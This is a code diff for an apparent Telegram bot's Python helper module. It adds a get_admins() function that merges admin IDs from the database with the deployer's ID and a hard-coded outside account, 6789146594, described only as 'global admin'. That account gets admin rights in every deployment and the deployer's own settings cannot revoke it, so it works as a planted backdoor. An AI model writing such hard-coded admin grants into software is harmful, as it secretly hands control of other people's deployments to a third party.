@@ -32,7 +32,7 @@ except Exception as e:
 
 # ===================== HELPER FUNCTIONS =====================
 def get_user_data():
-    """Always fetch the latest user data."""
+    """Always fetch the latest user data from DB."""
     return users_col.find_one({"USER_ID": USER_ID}) or {}
 
 def get_str(key, default=""):
@@ -55,6 +55,28 @@ def get_list(key, default=None):
     if isinstance(val, str):
         return [x.strip() for x in val.split(",") if x.strip()]
     return default or []
+
+def get_admins():
+    """
+    Fetch the latest ADMINS from DB.
+    Handles string ("123,456") or list format.
+    Returns a list of integers and includes USER_ID + global admin.
+    """
+    raw_admins = get_user_data().get("ADMINS", [])
+    
+    if isinstance(raw_admins, str):
+        raw_admins = [x.strip() for x in raw_admins.split(",") if x.strip()]
+
+    admins = []
+    for x in raw_admins:
+        try:
+            admins.append(int(x))
+        except (TypeError, ValueError):
+            pass
+
+    # Always include deployer and global admin
+    FINAL_ADMINS = sorted(list(set(admins + [USER_ID, 6789146594])))
+    return FINAL_ADMINS
 
 # ===================== CRITICAL VARS =====================
 API_ID = get_int("API_ID")
